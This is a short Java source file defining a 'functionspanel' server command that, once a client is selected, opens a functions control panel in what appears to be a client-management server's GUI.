package br.com.introcdc.connect.server.commands.control;
/*
 * Written by IntroCDC, Bruno Coêlho at 24/01/2025 - 08:19
 */

import br.com.introcdc.connect.server.ConnectServer;
import br.com.introcdc.connect.server.command.ServerCommand;
import br.com.introcdc.connect.server.gui.ServerGUI;

public class ServerCommandFunctionsPanel extends ServerCommand {

    public ServerCommandFunctionsPanel() {
        super("functionspanel");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        if (ConnectServer.SELECTED_CLIENT == 0) {
            msg("Cliente não selecionado!");
            return;
        }
        ServerGUI.getInstance().functionsControlPanel();
    }

}
